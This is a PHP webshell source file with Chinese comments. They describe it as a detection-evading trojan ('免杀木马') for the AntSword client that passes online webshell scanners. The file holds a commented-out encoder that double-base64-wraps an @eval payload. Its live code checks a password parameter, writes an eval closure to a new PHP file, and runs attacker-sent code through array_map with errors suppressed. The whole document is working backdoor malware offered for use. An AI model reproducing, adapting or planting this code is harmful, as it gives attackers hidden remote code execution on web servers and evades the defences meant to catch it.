<?php
/*
 * @Author : 青山(一个大混子)
 * @PHP免杀测试
 * @使用方法：antswrod 2次测试链接
 * @介绍：改动的第一版php免杀木马 此版本为写入文件调用 在线webshell检测：全票通过
 * @编码器：与第一版增加 data['qs'] = pwd
 */

//此处是编码器
/*
 
'use strict';

module.exports = (pwd, data, ext = null) => {
    // 生成一个随机变量名
    let randomID;
    if (ext.opts.otherConf['use-random-variable'] === 1) {
        randomID = antSword.utils.RandomChoice(antSword['RANDOMWORDS']);
    } else {
        randomID = `${antSword['utils'].RandomLowercase()}${Math.random().toString(16).substr(2)}`;
    }
    data[randomID] = Buffer
        .from(data['_'])
        .toString('base64');
    data[pwd] = pwd + Buffer.from(`@eval(@base64_decode($_POST['${randomID}']));`).toString('base64');
    data[pwd] = Buffer.from(data[pwd]).toString('base64');
    data['qs'] = pwd;
    delete data['_'];
    return data;
}
*/

//去除报错
error_reporting(0);

class go extends PWAF {
    //password
    public $pass = "qingshan";

    public function run(){
        if($this->checkPass()){
            $param = $this->parser($this->getData());
            if($param){
                // echo $param;
                if (isset($_REQUEST['qs']) && $_REQUEST['qs'] == $this->pass && !file_exists($this->pass.'.php')){
                    @file_put_contents($this->pass.'.php','<?php $Command = function ($param){ return @eval($param);};');
                    echo "it is ok!";
                }else{
                    require_once($this->pass.'.php');
                    echo $this->pass($Command,$param);
                }
            }else{
                echo "parser is wrong!";
            }
        }else{
            echo "pass is wrong!";
        }
    }
    //检查key
    public function checkPass(){
        if(isset($_REQUEST[$this->pass])){
            return true;
        }
        return false;
    }
    //获取请求数据
    public function getData(){
        $data = $_REQUEST[$this->pass];
        return $data;
    }
    //解析参数加密
    public function parser($param){
        $data = base64_decode($param);
        $key = substr($data,0,strlen($this->pass));
        if ($key == $this->pass){
            $data = substr_replace($data,'',0,strlen($this->pass));
            return base64_decode($data);
        }else{
            return false;
        }
    }
};

class PWAF {
    public function pass($command,$param){
        $res = array_map($command, [$param]);
        return $res;
    }
}

$a = new go();
$a->run();